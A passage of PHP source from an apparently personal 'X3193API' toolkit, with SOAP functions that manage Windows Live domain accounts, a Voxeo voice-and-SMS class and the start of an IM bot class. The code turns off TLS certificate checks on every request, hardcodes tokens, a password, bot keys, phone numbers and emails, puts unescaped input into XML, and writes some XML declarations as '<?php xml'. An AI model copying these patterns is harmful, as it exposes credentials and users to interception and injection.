                                '<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">'.
                                '<soap:Body>'.
                                '<TestConnectionResponse xmlns="http://domains.live.com/Service/ManageDomain/V1.0">'.
                                '<TestConnectionResult>Connection successful</TestConnectionResult>'.
                                '</TestConnectionResponse>'.
                                '</soap:Body>'.
                                '</soap:Envelope>';
        }       
        else{   
                $ch = curl_init();
                $SoapRequest = "<?php xml version='1.0' encoding='utf-8'?>".
                                "<soap:Envelope xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance' xmlns:xsd='http://www.w3.org/2001/XMLSchema' xmlns:soap='http://schemas.xmlsoap.org/soap/envelope/'>".
                                "<soap:Header>".
                                "<ManageDomain2Authorization xmlns='http://domains.live.com/Service/ManageDomain/V1.0'>".
                                "<authorizationType>PassportTicket</authorizationType>".
                                "<authorizationData>".htmlspecialchars($AuthData)."</authorizationData>".
                                "</ManageDomain2Authorization>".
                                "</soap:Header>".
                                "<soap:Body>".
                                "<TestConnection xmlns='http://domains.live.com/Service/ManageDomain/V1.0'>".
                                "<name>".$username."</name>".
                                "</TestConnection>".
                                "</soap:Body>".
                                "</soap:Envelope>"; // 授权数据需要经过HTML格式编码为：“&amp;”（“&”），“&lt;”（“<”）等。
                $url = "https://domains.live.com/service/managedomain2.asmx";
                $header = array(
                                'SOAPAction: http://domains.live.com/Service/ManageDomain/V1.0/TestConnection',
                                'Content-Type: text/xml; charset=utf-8',
                                'Content-length: '.strlen($SoapRequest),
                                'Host: domains.live.com'
                );      
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $url);
                curl_setopt($ch, CURLOPT_HEADER, 0);
                curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'POST');
                curl_setopt($ch, CURLOPT_POSTFIELDS, $SoapRequest);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                curl_setopt($ch, CURLOPT_TIMEOUT, 150);
                $xmlstr = curl_exec($ch);
                curl_close($ch);
        }
        $objXml = new DOMDocument();  
        $objXml->preserveWhiteSpace = true;
        $objXml->async = false; 
        $objXml->loadXML($xmlstr);
        $TestConnect = $objXml->getElementsByTagName("TestConnectionResult")->item(0)->nodeValue;
        if (stripos($TestConnect, "Connection successful")>='0'){
                return true;
        }
        else{
                return false;
        }
}

// ---------------------------------------------------
//  返回内容：$domainlist 返回格式：数组
// ---------------------------------------------------

function livedomainlist($authdata,$page,$pagesize){
        if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
                $xmlstr = '<'.'?'.'xml version="1.0" encoding="utf-8"?>'.
                                '<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">'.
                                '<soap:Body>'.
                                '<EnumDomainsResponse xmlns="http://domains.live.com/Service/ManageDomain/V1.0">'.
                                '<EnumDomainsResult>';
                for($i=1;$i<=100;$i++){         
                        $xmlstr = $xmlstr.
                                '<DomainInfo>'.
                                '<domainName>live.x3193.cz.cc</domainName>'.
                                '<active>false</active>'.
                                '<numUsers>5</numUsers>'.
                                '<maxUsers>500</maxUsers>'.
                                '</DomainInfo>';
                }
                $xmlstr = $xmlstr.
                                '</EnumDomainsResult>'.
                                '</EnumDomainsResponse>'.
                                '</soap:Body>'.
                                '</soap:Envelope>';
        }       
        else{   
                $ch = curl_init();
                $SoapRequest = "<?php xml version='1.0' encoding='utf-8'?>".
                                "<soap:Envelope xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance' xmlns:xsd='http://www.w3.org/2001/XMLSchema' xmlns:soap='http://schemas.xmlsoap.org/soap/envelope/'>".
                                "<soap:Header>".
                                "<ManageDomain2Authorization xmlns='http://domains.live.com/Service/ManageDomain/V1.0'>".
                                "<authorizationType>PassportTicket</authorizationType>".
                                "<authorizationData>".htmlspecialchars($authdata)."</authorizationData>".
                                "</ManageDomain2Authorization>".
                                "</soap:Header>".
                                "<soap:Body>".
                                "<EnumDomains xmlns='http://domains.live.com/Service/ManageDomain/V1.0' />".
                                "</soap:Body>".
                                "</soap:Envelope>";
                //echo $SoapRequest;            
                $url = "https://domains.live.com/service/managedomain2.asmx";
                $header = array(
                                'SOAPAction: http://domains.live.com/Service/ManageDomain/V1.0/EnumDomains',
                                'Content-Type: text/xml; charset=utf-8',
                                'Content-length: '.strlen($SoapRequest),
                                'Host: domains.live.com'
                );      
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $url);
                curl_setopt($ch, CURLOPT_HEADER, 0);
                curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'POST');
                curl_setopt($ch, CURLOPT_POSTFIELDS, $SoapRequest);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                curl_setopt($ch, CURLOPT_TIMEOUT, 150);
                $xmlstr = curl_exec($ch);
                curl_close($ch);
        }
        //return $xmlstr;
        $objXml = new DOMDocument();  
        $objXml->preserveWhiteSpace = true;
        $objXml->async = false; 
        $objXml->loadXML($xmlstr);
        $objList = $objXml->getElementsByTagName("DomainInfo");                 

        $domainlist = array();
        $domainlist['length'] = $objList->length;
        
        if ($objList->length > $pagesize) $strpagesize = $pagesize; else $strpagesize = $objList->length;
        $totalitem = $objList->length;
        if (fmod($totalitem, $pagesize) == 0){
                $totalpage=$totalitem/$pagesize;
        }       
        else{
                $totalpage=ceil($totalitem/$pagesize);
        }       
        if ($totalpage == $page)
                $endid = $totalitem-1;
        elseif ($totalpage > $page)
                $endid = floor($strpagesize*($page)-1);
        elseif ($totalpage < $page){
                $endid = floor($strpagesize*($page-1)-1);
        }                       

        for($i = $strpagesize*($page-1);$i <= $endid;$i++){
                $objHdd = $objList->item($i);
                $domainlist[$i]['domainname'] = iconv('utf-8','gb2312',$objHdd->getElementsByTagName('domainName')->item(0)->nodeValue);
                $domainlist[$i]['domainstatus'] = iconv('utf-8','gb2312',$objHdd->getElementsByTagName('active')->item(0)->nodeValue);
                $domainlist[$i]['domainnumuser'] = iconv('utf-8','gb2312',$objHdd->getElementsByTagName('numUsers')->item(0)->nodeValue);
                $domainlist[$i]['domainmaxuser'] = iconv('utf-8','gb2312',$objHdd->getElementsByTagName('maxUsers')->item(0)->nodeValue);
        }
        return $domainlist;
}

// ---------------------------------------------------
//  返回内容：$accountlist 返回格式：数组
// ---------------------------------------------------

function liveaccountlist($authdata,$domainname,$page,$pagesize){
        if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
                $xmlstr = '<'.'?'.'xml version="1.0" encoding="utf-8"?>'.
                                '<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">'.
                                '<soap:Body>'.
                                '<EnumMembersResponse xmlns="http://domains.live.com/Service/ManageDomain/V1.0">'.
                                '<EnumMembersResult>';
                for($i=1;$i<=100;$i++){                                         
                        $xmlstr = $xmlstr.
                                '<string>x3193@live.x3193.cz.cc</string>'.
                                '<string>robot@live.x3193.cz.cc</string>'.
                                '<string>admin@live.x3193.cz.cc</string>'.
                                '<string>webmaster@live.x3193.cz.cc</string>'.
                                '<string>xcy6272003@126.com</string>';
                }
                $xmlstr = $xmlstr.
                                '</EnumMembersResult>'.
                                '</EnumMembersResponse>'.
                                '</soap:Body>'.
                                '</soap:Envelope>';
        }       
        else{   
                $ch = curl_init();
                $SoapRequest = "<?php xml version='1.0' encoding='utf-8'?>".
                                "<soap:Envelope xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance' xmlns:xsd='http://www.w3.org/2001/XMLSchema' xmlns:soap='http://schemas.xmlsoap.org/soap/envelope/'>".
                                "<soap:Header>".
                                "<ManageDomain2Authorization xmlns='http://domains.live.com/Service/ManageDomain/V1.0'>".
                                "<authorizationType>PassportTicket</authorizationType>".
                                "<authorizationData>".htmlspecialchars(trim($authdata))."</authorizationData>".
                                "</ManageDomain2Authorization>".
                                "</soap:Header>".
                                '<soap:Body>'.
                                '<EnumMembers xmlns="http://domains.live.com/Service/ManageDomain/V1.0">'.
                                '<domainName>'.$domainname.'</domainName>'.
                                '<start>'.''.'</start>'.
                                '<num>5000000</num>'.
                                '</EnumMembers>'.
                                '</soap:Body>'.
                                '</soap:Envelope>';
                //echo $SoapRequest;            
                $url = "https://domains.live.com/service/managedomain2.asmx";
                $header = array(
                                'SOAPAction: http://domains.live.com/Service/ManageDomain/V1.0/EnumMembers',
                                'Content-Type: text/xml; charset=utf-8',
                                'Content-length: '.strlen($SoapRequest),
                                'Host: domains.live.com'
                );      
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $url);
                curl_setopt($ch, CURLOPT_HEADER, 0);
                curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'POST');
                curl_setopt($ch, CURLOPT_POSTFIELDS, $SoapRequest);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                curl_setopt($ch, CURLOPT_TIMEOUT, 150);
                $xmlstr = curl_exec($ch);
                curl_close($ch);
        }
        //return $xmlstr;
        $objXml = new DOMDocument();  
        $objXml->preserveWhiteSpace = true;
        $objXml->async = false; 
        $objXml->loadXML($xmlstr);
        $objList = $objXml->getElementsByTagName("string");                     

        $accountlist = array();
        $accountlist['length'] = $objList->length;
        
        if ($objList->length > $pagesize) $strpagesize = $pagesize; else $strpagesize = $objList->length;
        $totalitem = $objList->length;
        if (fmod($totalitem, $pagesize) == 0){
                $totalpage=$totalitem/$pagesize;
        }       
        else{
                $totalpage=ceil($totalitem/$pagesize);
        }       
        if ($totalpage == $page)
                $endid = $totalitem-1;
        elseif ($totalpage > $page)
                $endid = floor($strpagesize*($page)-1);
        elseif ($totalpage < $page){
                $endid = floor($strpagesize*($page-1)-1);
        }                       

        for($i = $strpagesize*($page-1);$i <= $endid;$i++){
                $objHdd = $objList->item($i);
                $accountlist[$i]['username'] = iconv('utf-8','gb2312',$objList->item($i)->nodeValue);
        }
        return $accountlist;
}

// ---------------------------------------------------
//  返回内容：$accountremove 返回格式：数组
// ---------------------------------------------------

function liveaccountremove($authdata,$domainname,$accountname,$postfield){
        //print_r($_POST);
        //print_r($postfield);
        $xmlcode = "";
        $msg = "";              
        if ($domainname != "" && $accountname != "" && count($postfield) == 0){
                if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
                        $xmlcode = "200";
                        $msg = "ok";            
                }       
                else{   
                        $ch = curl_init();
                        if (stripos($accountname,'@')===false){
                                $membername = $accountname.'@'.$domainname;
                        }
                        elseif (stripos($accountname,'@')>='0'){
                                $membername = $accountname;
                        }       
                        $SoapRequest = '<?php xml version="1.0" encoding="utf-8"?>'.
                                        '<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">'.
                                        '<soap:Header>'.
                                        '<ManageDomain2Authorization xmlns="http://domains.live.com/Service/ManageDomain/V1.0">'.
                                        '<authorizationType>PassportTicket</authorizationType>'.
                                        '<authorizationData>'.htmlspecialchars(trim($authdata)).'</authorizationData>'.
                                        '</ManageDomain2Authorization>'.
                                        '</soap:Header>'.
                                        '<soap:Body>'.
                                        '<DeleteMember xmlns="http://domains.live.com/Service/ManageDomain/V1.0">'.
                                        '<memberNameIn>'.$membername.'</memberNameIn>'.
                                        '</DeleteMember>'.
                                        '</soap:Body>'.                                 
                                        '</soap:Envelope>';
                        //echo $SoapRequest;            
                        //return;
                        $url = "https://domains.live.com/service/managedomain2.asmx";
                        $header = array(
                                        'SOAPAction: http://domains.live.com/Service/ManageDomain/V1.0/DeleteMember',
                                        'Content-Type: text/xml; charset=utf-8',
                                        'Content-length: '.strlen($SoapRequest),
                                        'Host: domains.live.com'
                        );      
                        $ch = curl_init();
                        curl_setopt($ch, CURLOPT_URL, $url);
                        curl_setopt($ch, CURLOPT_HEADER, 0);
                        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
                        curl_setopt($ch, CURLOPT_POST, 1);
                        curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'POST');
                        curl_setopt($ch, CURLOPT_POSTFIELDS, $SoapRequest);
                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                        curl_setopt($ch, CURLOPT_TIMEOUT, 150);
                        $xmlstr = curl_exec($ch);
                        $xmlcode = curl_getinfo($ch,CURLINFO_HTTP_CODE);
                        $msg = 'ok';
                        curl_close($ch);
                }
                //return $xmlstr;
                //return $xmlcode;
        }
        elseif ($domainname != "" && count($postfield) > 0){
                //echo 'eee';
        
                for($i = 0;$i <= count($postfield);$i++){
                        if ($postfield["chidd".$i] != ""){
                                //return 'hhh';
                                if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
                                        $xmlcode = "200";
                                        $msg = "ok";
                                        //return 'ggg';
                                }       
                                else{   
                                        $ch = curl_init();
                                        $SoapRequest = '<?php xml version="1.0" encoding="utf-8"?>'.
                                                        '<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">'.
                                                        '<soap:Header>'.
                                                        '<ManageDomain2Authorization xmlns="http://domains.live.com/Service/ManageDomain/V1.0">'.
                                                        '<authorizationType>PassportTicket</authorizationType>'.
                                                        '<authorizationData>'.htmlspecialchars(trim($_SESSION["live"]["authdata"])).'</authorizationData>'.
                                                        '</ManageDomain2Authorization>'.
                                                        '</soap:Header>'.
                                                        '<soap:Body>'.
                                                        '<DeleteMember xmlns="http://domains.live.com/Service/ManageDomain/V1.0">'.
                                                        '<memberNameIn>'.trim($postfield["chidd".$i]).'</memberNameIn>'.
                                                        '</DeleteMember>'.
                                                        '</soap:Body>'.                                 
                                                        '</soap:Envelope>';
                                        //echo $SoapRequest;            
                                        //return $SoapRequest;
                                        $url = "https://domains.live.com/service/managedomain2.asmx";
                                        $header = array(
                                                        'SOAPAction: http://domains.live.com/Service/ManageDomain/V1.0/DeleteMember',
                                                        'Content-Type: text/xml; charset=utf-8',
                                                        'Content-length: '.strlen($SoapRequest),
                                                        'Host: domains.live.com'
                                        );      
                                        $ch = curl_init();
                                        curl_setopt($ch, CURLOPT_URL, $url);
                                        curl_setopt($ch, CURLOPT_HEADER, 0);
                                        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
                                        curl_setopt($ch, CURLOPT_POST, 1);
                                        curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'POST');
                                        curl_setopt($ch, CURLOPT_POSTFIELDS, $SoapRequest);
                                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                                        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                                        curl_setopt($ch, CURLOPT_TIMEOUT, 150);
                                        $xmlstr = curl_exec($ch);
                                        $xmlcode = curl_getinfo($ch,CURLINFO_HTTP_CODE);
                                        $msg = "ok";            
                                        curl_close($ch);        
                                        //return $xmlcode;      
                                }
                                if ($xmlcode == "200" && $msg == "ok"){
                                }
                                else{
                                        break;
                                }       
                        }       
                }
                //return 'xmlcode';                             
        }
        elseif($domainname != "" && $username == "" && count($postfield) == 0){
                $xmlcode = '-1';
                $msg = "sorry"; 
                //return 'hhhh';
        }       
        $accountremove['xmlcode'] = $xmlcode;
        $accountremove['msg'] = $msg;   
        return  $accountremove;
}

// ---------------------------------------------------
//  返回内容：$accountcreate 返回格式：数组
// ---------------------------------------------------

function liveaccountcreate($authdata,$domainname,$username,$userpwd,$firstname,$lastname,$lcid){
        if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
                $xmlstr = '<?php xml version="1.0" encoding="utf-8"?>'.
                                '<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">'.
                                '<soap:Body>'.
                                '<CreateMemberResponse xmlns="http://domains.live.com/Service/ManageDomain/V1.0">'.
                                '<CreateMemberResult>string</CreateMemberResult>'.
                                '</CreateMemberResponse>'.
                                '</soap:Body>'.
                                '</soap:Envelope>';
                $xmlcode = '200';
        }       
        else{   
                $ch = curl_init();
                $membername = $domainname==""?$username:$username.iconv('gb2312','utf-8',$domainname);
                $SoapRequest = '<?php xml version="1.0" encoding="utf-8"?>'.
                                '<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">'.
                                '<soap:Header>'.
                                '<ManageDomain2Authorization xmlns="http://domains.live.com/Service/ManageDomain/V1.0">'.
                                '<authorizationType>PassportTicket</authorizationType>'.
                                '<authorizationData>'.htmlspecialchars(trim($authdata)).'</authorizationData>'.
                                '</ManageDomain2Authorization>'.
                                '</soap:Header>'.
                                '<soap:Body>'.
                                '<CreateMember xmlns="http://domains.live.com/Service/ManageDomain/V1.0">'.
                                '<memberNameIn>'.$membername.'</memberNameIn>'.
                                '<password>'.$userpwd.'</password>'.
                                '<resetPassword>false</resetPassword>'.
                                '<firstName>'.iconv('gb2312','utf-8',trim($firstname)).'</firstName>'.
                                '<lastName>'.iconv('gb2312','utf-8',trim($lastname)).'</lastName>'.
                                '<lcid>'.trim($lcid).'</lcid>'.
                                '</CreateMember>'.
                                '</soap:Body>'.
                                '</soap:Envelope>';
                //echo $SoapRequest;            
                //return;
                $url = "https://domains.live.com/service/managedomain2.asmx";
                $header = array(
                                'SOAPAction: http://domains.live.com/Service/ManageDomain/V1.0/CreateMember',
                                'Content-Type: text/xml; charset=utf-8',
                                'Content-length: '.strlen($SoapRequest),
                                'Host: domains.live.com'
                );      
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $url);
                curl_setopt($ch, CURLOPT_HEADER, 0);
                curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'POST');
                curl_setopt($ch, CURLOPT_POSTFIELDS, $SoapRequest);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                curl_setopt($ch, CURLOPT_TIMEOUT, 150);
                $xmlstr = curl_exec($ch);
                $xmlcode = curl_getinfo($ch,CURLINFO_HTTP_CODE);
                curl_close($ch);
        }
        $objXml = new DOMDocument();  
        $objXml->preserveWhiteSpace = true;
        $objXml->async = false; 
        $objXml->loadXML($xmlstr);
        $accountcreate['result'] = iconv('utf-8','gb2312',$objXml->getElementsByTagName("CreateMemberResult")->item(0)->nodeValue);
        $accountcreate['error'] = iconv('utf-8','gb2312',$objXml->getElementsByTagName("faultstring")->item(0)->nodeValue);
        $accountcreate['xmlcode'] = $xmlcode;
        //print_r($accountcreate);                      
        return $accountcreate;
}

// ---------------------------------------------------
//  返回内容：$xmlcode 返回格式：数字
// ---------------------------------------------------

function liveaccountrename($AuthData,$domainname,$username,$oldusername){
        if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
                $xmlstr = '<?php xml version="1.0" encoding="utf-8"?>'.
                                '<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">'.
                                '<soap:Body>'.
                                '<RenameMemberResponse xmlns="http://domains.live.com/Service/ManageDomain/V1.0" />'.
                                '</soap:Body>'.
                                '</soap:Envelope>';
                $xmlcode = '200';
        }       
        else{   
                $ch = curl_init();
                $membername = trim($domainname)==""?trim($username):trim($username).iconv('gb2312','utf-8',trim($domainname));
                $SoapRequest = '<?php xml version="1.0" encoding="utf-8"?>'.
                                '<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">'.
                                '<soap:Header>'.
                                '<ManageDomain2Authorization xmlns="http://domains.live.com/Service/ManageDomain/V1.0">'.
                                '<authorizationType>PassportTicket</authorizationType>'.
                                '<authorizationData>'.htmlspecialchars(trim($AuthData)).'</authorizationData>'.
                                '</ManageDomain2Authorization>'.
                                '</soap:Header>'.
                                '<soap:Body>'.
                                '<RenameMember xmlns="http://domains.live.com/Service/ManageDomain/V1.0">'.
                                '<memberNameOldIn>'.iconv('gb2312','utf-8',$oldusername).'</memberNameOldIn>'.
                                '<memberNameNewIn>'.iconv('gb2312','utf-8',$membername).'</memberNameNewIn>'.
                                '</RenameMember>'.
                                '</soap:Body>'.
                                '</soap:Envelope>';
                //echo $SoapRequest;            
                //return;
                $url = "https://domains.live.com/service/managedomain2.asmx";
                $header = array(
                                'SOAPAction: http://domains.live.com/Service/ManageDomain/V1.0/RenameMember',
                                'Content-Type: text/xml; charset=utf-8',
                                'Content-length: '.strlen($SoapRequest),
                                'Host: domains.live.com'
                );      
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $url);
                curl_setopt($ch, CURLOPT_HEADER, 0);
                curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'POST');
                curl_setopt($ch, CURLOPT_POSTFIELDS, $SoapRequest);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                curl_setopt($ch, CURLOPT_TIMEOUT, 150);
                $xmlstr = curl_exec($ch);
                $xmlcode = curl_getinfo($ch,CURLINFO_HTTP_CODE);
                curl_close($ch);
        }
        $accountrename['xmlcode'] = $xmlcode;
        //echo $xmlstr;
        return $accountrename;                  
}

}
?>

<?php 

// ----------------------------------------------------------------
//  Evolution.voxeo.com - X3193语音和英文短信系统非标准独立类 v1.1
//  供能：实现英文语音和英文短信收发
//  实现：X3193API
//  供应：voxeo.com
//  收藏：☆☆☆☆☆
//  时间：2011-7-27 11:34AM
//  行数：45行
// ----------------------------------------------------------------
//  更新日志：
// ----------------------------------------------------------------

class voxeo_class{

var $botkey = '94491';
var $usernumber = '+12026008419';
var $OutboundDialingtoken = 'acfa26853aa07c4698004bec3aabf526ffe78951af341a43020a8a66e49acdbe0b57a1269e9bffff3865a319';
var $clientdialnumber = '14074181800';
var $voxeouser = 'x3193';
var $voxeopwd = 'EUIfgwe7';

function OutboundDialing($Calledid) {
	$url = "http://api.voxeo.net/SessionControl/4.5.41/VoiceXML.start?tokenid=".$this->OutboundDialingtoken."&callerid=14074181800&numbertodial=".encodeuri($Calledid);
	//$postdata = '';
	//$header[] = "Content-type: application/x-www-form-urlencoded; charset=utf-8";
	//$header[] = "Content-length: ".strlen($postdata);
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_HEADER, 1);
	//curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'POST');
	//curl_setopt($ch, CURLOPT_USERPWD, $voxeouser.':'.$voxeopwd);
	//curl_setopt($ch, CURLOPT_HTTPHEADER, $header);                  
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_TIMEOUT, 150);
	//curl_setopt($ch, CURLOPT_POST, 1);
	//curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
	$result = curl_exec($ch);
	
  $tmpArr = explode("\n", $result);
  $resultArr = array();
  for($i=1;$i<count($tmpArr);$i++) {
                $value = trim($tmpArr[$i]);
                if($value != '') {
	                if(($value == 'success') && ($i==count($tmpArr)-2)){
	  								$resultArr['result'] = $value;
  	              }
                	else{
                  	$arr = explode(':', $value);
                  	if($arr[0]=='Date'){
    	              	$k = $arr[0];
	                  	$resultArr[$k] = $arr[1].":".$arr[2].":".$arr[3];
                  	}
                  	else{
    	              	$k = $arr[0];
  	                	$v = $arr[1];
	                  	$resultArr[$k] = $v;
                  	}
                	}
                }
  }

  $resultArr['code'] = curl_getinfo($ch,CURLINFO_HTTP_CODE);
  $resultArr['timestamp'] = strtotime($resultArr['Date']);
  $resultArray = array();
  if($resultArr['result'] == 'success')
  	$resultArray['result'] = 'ok';
  $resultArray['timestamp'] = $resultArr['timestamp'];
  
	curl_close($ch);
	//print_r($tmpArr);
	return $resultArray;
}

function Phonelimiter() {
 $phoneallow = "xcy6272003|8615998963077|503a8766-770c-4e41-bfb7-9e4735a3d0dc"; 
 return $phoneallow;
}

function voxeoverifycallid($callid){
 	$allowphone = $this->Phonelimiter();
	for($i=0;$i<count(split("[|]",$allowphone));$i++){
		// voxeo CALLME 插件特有
  	if(preg_match("/\w{8}[-]\w{4}[-]\w{4}[-]\w{4}[-]\w{12}/", strtolower(trim(arrmember(split("[|]",$allowphone),$i))))){
   		return "1";
  	}
  	elseif($callid==arrmember(split("[|]",$allowphone),$i)){
   		return "1";
  	}
 	}
 	return "0";
}

function voxeosendsms($userto,$msg){
	$url = 'http://api.messaging.staging.voxeo.net/1.0/messaging';
	$postdata = "botkey=".$this->botkey."&apimethod=send&user=".trim($userto)."&network=SMS&from=".trim($this->usernumber)."&msg=".encodeuri($msg);
	$header[] = "Content-type: application/x-www-form-urlencoded; charset=utf-8";
	$header[] = "Content-length: ".strlen($postdata);
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_HEADER, 0);
	curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'POST');
	curl_setopt($ch, CURLOPT_USERPWD, $this->voxeouser.':'.$this->voxeopwd);
	curl_setopt($ch, CURLOPT_HTTPHEADER, $header);                  
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_TIMEOUT, 15000);
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
	$xmlstr = curl_exec($ch);
	$xmlcode = curl_getinfo($ch,CURLINFO_HTTP_CODE);
	curl_close($ch);
	return $xmlstr;
}

function receivesms($voxeouser,$voxeopwd,$usernumber,$userfrom,$msg){
	return "&to=".trim($usernumber)."user=".trim($userfrom)."&msg=".encodeuri($msg);
}


}
?>

<?php 

// ----------------------------------------------------------------
//  Www.imified.com - X3193即时通机器人系统非标准独立类 v1.1
//  供能：实现GTALK/JABBER/MSN/YAHOO的消息收发
//  实现：X3193API
//  供应：imified.com
//  收藏：☆☆☆☆☆
//  时间：2011-7-27 11:34AM
//  行数：137行
// ----------------------------------------------------------------
//  更新日志：
// ----------------------------------------------------------------

class imified_class{

var $botkey = 'EEB8B13F-60E8-4C5A-9DFC854AC18FF5A5';

function imifiedsendmsg($imifiedu,$imifiedp,$imreuser,$imrenetwork,$imcontent){
	$contactstr = strtolower(trim($imreuser));
	$contactnetworkstr = strtolower(trim($imrenetwork));
	if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
	        $xmlstr = '<rsp stat="ok">'.
	                        '<users count="3"><user><status></status><extendedstatus></extendedstatus><userkey>8C338311-3075-4073-82CEA566F138998C</userkey><screenname>msn.bot.im</screenname><user>msn.bot.im</user><network>Jabber</network><created>{ts \'2010-02-11 15:46:17\'}</created><lastcall>{ts \'2010-06-07 04:36:03\'}</lastcall><lastonline></lastonline></user><user><status></status><extendedstatus></extendedstatus><userkey>C08884D8-940A-4561-ABB21857F2AFCAD0</userkey><screenname>wanw.x3193.3322.org@gmail.com</screenname><user>wanw.x3193.3322.org@gmail.com</user><network>Jabber</network><created>{ts \'2010-05-03 07:17:45\'}</created><lastcall>{ts \'2010-06-05 08:27:57\'}</lastcall><lastonline></lastonline></user><user><status></status><extendedstatus></extendedstatus><userkey>6485AAF9-3DF3-4947-ACABB277DA26531E</userkey><screenname>x3193.cz.cc@gmail.com</screenname><user>x3193.cz.cc@gmail.com</user><network>Jabber</network><created>{ts \'2010-06-05 06:24:42\'}</created><lastcall>{ts \'2010-06-05 12:08:07\'}</lastcall><lastonline></lastonline></user></users>'.
	                        '</rsp>';
	}       
	else{   
	        $ch = curl_init();
